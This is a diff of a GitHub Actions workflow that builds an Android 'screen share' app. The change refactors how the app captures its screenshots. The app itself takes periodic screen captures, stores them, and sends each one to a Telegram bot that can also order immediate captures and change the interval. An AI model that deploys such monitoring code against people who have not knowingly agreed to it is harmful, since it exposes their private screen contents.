@@ -44,8 +44,8 @@ jobs:
                   applicationId "com.lan.screenshare"
                   minSdk 26
                   targetSdk 34
-                  versionCode 17
-                  versionName "4.0-continuous"
+                  versionCode 18
+                  versionName "4.1-stable"
               }
               compileOptions {
                   sourceCompatibility JavaVersion.VERSION_17
@@ -66,7 +66,6 @@ jobs:
               <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
               <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
               <application
@@ -330,25 +329,19 @@ jobs:
                   @Volatile var captureInterval = 30_000L
 
                   private var instance: StreamService? = null
-                  fun captureNow(): ByteArray? = instance?.readImageFromReader()
               }
 
               private var projection: MediaProjection? = null
-              private var virtualDisplay: VirtualDisplay? = null
-              private var imageReader: ImageReader? = null
               private var serverSocket: ServerSocket? = null
               private var wakeLock: PowerManager.WakeLock? = null
-              private var projectionHandler: Handler? = null
-
               private var pollingThread: Thread? = null
-              private var autoThread: Thread? = null
+              private var captureHandler: Handler? = null
               private var lastUpdateId = 0L
               @Volatile private var stopRequested = false
 
               private val projCallback = object : MediaProjection.Callback() {
                   override fun onStop() {
                       isCapturing = false
-                      cleanupResources()
                       updateNotification("متوقف 🔴")
                   }
               }
@@ -366,6 +359,9 @@ jobs:
               override fun onCreate() {
                   super.onCreate()
                   registerLockReceiver()
+                  val handlerThread = HandlerThread("CaptureLoop")
+                  handlerThread.start()
+                  captureHandler = Handler(handlerThread.looper)
               }
 
               override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -392,42 +388,22 @@ jobs:
 
               private fun startProjection(code: Int, data: Intent) {
                   try {
-                      stopAll() // تنظيف أي جلسة سابقة
+                      stopAll() 
                       stopRequested = false
                       userPaused = false
                       
-                      // 1. إنشاء الإشعار والخدمة الأمامية أولاً
                       createNotification("جاري التهيئة...")
 
-                      // 2. بدء MediaProjection
                       val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                       projection = mgr.getMediaProjection(code, data)
-                      
-                      val handlerThread = HandlerThread("ProjectionThread")
-                      handlerThread.start()
-                      projectionHandler = Handler(handlerThread.looper)
-                      
-                      projection?.registerCallback(projCallback, projectionHandler)
-
-                      // 3. إعداد الشاشة الافتراضية (مرة واحدة فقط لضمان الأداء)
-                      val metrics = resources.displayMetrics
-                      val w = 480
-                      var h = (metrics.heightPixels * (480f / metrics.widthPixels)).toInt()
-                      if (h % 2 != 0) h++
-
-                      imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
-                      virtualDisplay = projection?.createVirtualDisplay(
-                          "ScreenCapture", w, h, metrics.densityDpi,
-                          DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                          imageReader?.surface, null, projectionHandler
-                      )
+                      projection?.registerCallback(projCallback, Handler(Looper.getMainLooper()))
 
                       isCapturing = true
                       acquireWakeLock()
                       startHttpServer()
                       startBotPolling()
+                      
                       startAutoLoop()
-
                       updateNotification("يعمل 🟢")
                   } catch (e: Exception) {
                       e.printStackTrace()
@@ -437,16 +413,14 @@ jobs:
               }
 
               private fun startAutoLoop() {
-                  if (autoThread?.isAlive == true) return
-                  autoThread = thread(name = "AutoLoop") {
-                      var lastCaptureTime = 0L
-                      while (isCapturing && !stopRequested) {
-                          val now = System.currentTimeMillis()
-                          // التحقق من الوقت كل ثانية لضمان سرعة الاستجابة لتغيير الفاصل الزمني
-                          if (!userPaused && screenOn && (now - lastCaptureTime >= captureInterval)) {
-                              lastCaptureTime = now
+                  captureHandler?.removeCallbacksAndMessages(null)
+                  val runnable = object : Runnable {
+                      override fun run() {
+                          if (!isCapturing || stopRequested) return
+                          
+                          if (!userPaused && screenOn) {
                               try {
-                                  val bytes = readImageFromReader()
+                                  val bytes = captureOne()
                                   if (bytes != null) {
                                       saveScreenshotToDisk(bytes)
                                       sendToTelegram(bytes)
@@ -455,52 +429,70 @@ jobs:
                                   e.printStackTrace()
                               }
                           }
-                          try { Thread.sleep(1000) } catch (_: Exception) { break }
+                          // إعادة الجدولة للصورة القادمة
+                          captureHandler?.postDelayed(this, captureInterval)
                       }
                   }
+                  captureHandler?.post(runnable)
               }
 
-              private fun readImageFromReader(): ByteArray? {
-                  val reader = imageReader ?: return null
-                  var img: android.media.Image? = null
+              // هذه الدالة تنشئ الشاشة الافتراضية وتلتقط وتغلقها فوراً لتجنب قتل النظام للتطبيق
+              private fun captureOne(): ByteArray? {
+                  val proj = projection ?: return null
+                  var vd: VirtualDisplay? = null
+                  var ir: ImageReader? = null
                   var bmp: Bitmap? = null
                   var finalBmp: Bitmap? = null
                   try {
-                      // إزالة أي صور قديمة عالقة في الذاكرة
-                      while (reader.acquireLatestImage() != null) { }
+                      val metrics = resources.displayMetrics
+                      val w = 480
+                      var h = (metrics.heightPixels * (480f / metrics.widthPixels)).toInt()
+                      if (h % 2 != 0) h++
 
-                      // الانتظار حتى تأتي صورة جديدة
+                      ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
+                      vd = proj.createVirtualDisplay(
+                          "ScreenCapture", w, h, metrics.densityDpi,
+                          DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                          ir.surface, null, null
+                      ) ?: return null
+
+                      var img: android.media.Image? = null
                       val deadline = System.currentTimeMillis() + 2000
                       while (System.currentTimeMillis() < deadline) {
-                          img = reader.acquireLatestImage()
+                          img = ir.acquireLatestImage()
                           if (img != null) break
                           Thread.sleep(50)
                       }
                       img ?: return null
 
-                      val plane = img.planes[0]
-                      val buf = plane.buffer
-                      val pixelStride = plane.pixelStride
-                      val rowStride = plane.rowStride
-                      val rowPadding = rowStride - pixelStride * 480
-                      val bmpWidth = 480 + rowPadding / pixelStride
+                      try {
+                          val plane = img.planes[0]
+                          val buf = plane.buffer
+                          val pixelStride = plane.pixelStride
+                          val rowStride = plane.rowStride
+                          val rowPadding = rowStride - pixelStride * w
+                          val bmpWidth = w + rowPadding / pixelStride
 
-                      bmp = Bitmap.createBitmap(bmpWidth, img.height, Bitmap.Config.ARGB_8888)
-                      buf.rewind()
-                      bmp.copyPixelsFromBuffer(buf)
+                          bmp = Bitmap.createBitmap(bmpWidth, h, Bitmap.Config.ARGB_8888)
+                          buf.rewind()
+                          bmp.copyPixelsFromBuffer(buf)
 
-                      finalBmp = if (bmpWidth != 480) Bitmap.createBitmap(bmp, 0, 0, 480, img.height) else bmp
-                      val out = ByteArrayOutputStream()
-                      val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
-                                else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
-                      finalBmp.compress(fmt, 55, out)
-                      return out.toByteArray()
+                          finalBmp = if (bmpWidth != w) Bitmap.createBitmap(bmp, 0, 0, w, h) else bmp
+                          val out = ByteArrayOutputStream()
+                          val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
+                                    else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
+                          finalBmp.compress(fmt, 55, out)
+                          return out.toByteArray()
+                      } finally {
+                          img.close()
+                          if (finalBmp != null && finalBmp !== bmp) finalBmp.recycle()
+                          bmp?.recycle()
+                      }
                   } catch (_: Throwable) {
                       return null
                   } finally {
-                      img?.close()
-                      if (finalBmp != null && finalBmp !== bmp) finalBmp.recycle()
-                      bmp?.recycle()
+                      try { vd?.release() } catch (_: Throwable) {}
+                      try { ir?.close() } catch (_: Throwable) {}
                   }
               }
 
@@ -577,14 +569,17 @@ jobs:
                       }
                       "/10" -> {
                           captureInterval = 10_000L
+                          startAutoLoop() // إعادة تشغيل الحلقة بالوقت الجديد فوراً
                           sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 10 ثوانٍ.")
                       }
                       "/20" -> {
                           captureInterval = 20_000L
+                          startAutoLoop()
                           sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 20 ثانية.")
                       }
                       "/30" -> {
                           captureInterval = 30_000L
+                          startAutoLoop()
                           sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 30 ثانية.")
                       }
                       "/status" -> {
@@ -674,7 +669,6 @@ jobs:
                       val file = File(dayDir, "shot_${System.currentTimeMillis()}.webp")
                       file.writeBytes(webp)
 
-                      // حذف الملفات الأقدم من 4 أيام
                       val cutoff = System.currentTimeMillis() - 4L * 24 * 60 * 60 * 1000
                       root.listFiles()?.forEach { day ->
                           val dayTs = try {
@@ -683,7 +677,6 @@ jobs:
                           if (dayTs in 1..cutoff) day.deleteRecursively()
                       }
 
-                      // الحفاظ على مساحة 200 ميجابايت
                       val maxBytes = 200L * 1024 * 1024
                       val allFiles = root.walkTopDown().filter { it.isFile }
                           .sortedBy { it.lastModified() }
@@ -700,19 +693,13 @@ jobs:
                   } catch (_: Throwable) { null }
               }
 
-              private fun cleanupResources() {
-                  try { virtualDisplay?.release() } catch (_: Throwable) {}
-                  virtualDisplay = null
-                  try { imageReader?.close() } catch (_: Throwable) {}
-                  imageReader = null
-                  try { projection?.stop() } catch (_: Throwable) {}
-                  projection = null
-              }
-
               private fun stopAll() {
                   isCapturing = false
                   stopRequested = true
-                  cleanupResources()
+                  captureHandler?.removeCallbacksAndMessages(null)
+                  try { projection?.unregisterCallback(projCallback) } catch (_: Throwable) {}
+                  try { projection?.stop() } catch (_: Throwable) {}
+                  projection = null
                   try { serverSocket?.close() } catch (_: Throwable) {}
                   serverSocket = null
                   try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Throwable) {}
@@ -763,7 +750,7 @@ jobs:
 
                       when (path) {
                           "/now" -> {
-                              val bytes = readImageFromReader()
+                              val bytes = captureOne()
                               if (bytes == null) { sendText(out, "NO_PERMISSION"); return }
                               saveScreenshotToDisk(bytes)
                               sendToTelegram(bytes)
@@ -795,6 +782,7 @@ jobs:
                                   ?.substringAfter("ms=")?.toLongOrNull()
                               if (ms != null && ms in 5000..600000) {
                                   captureInterval = ms
+                                  startAutoLoop()
                                   sendText(out, "OK_$ms")
                               } else {
                                   sendText(out, "CURRENT_$captureInterval")
@@ -919,7 +907,6 @@ jobs:
                   stopAll()
                   try { unregisterReceiver(lockStateReceiver) } catch (_: Throwable) {}
                   try { pollingThread?.interrupt() } catch (_: Throwable) {}
-                  try { autoThread?.interrupt() } catch (_: Throwable) {}
                   super.onDestroy()
               }
 
@@ -944,5 +931,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: ScreenShareLAN-AutoCapture
+          name: ScreenShareLAN-AutoCapture-Stable
           path: app/build/outputs/apk/debug/app-debug.apk
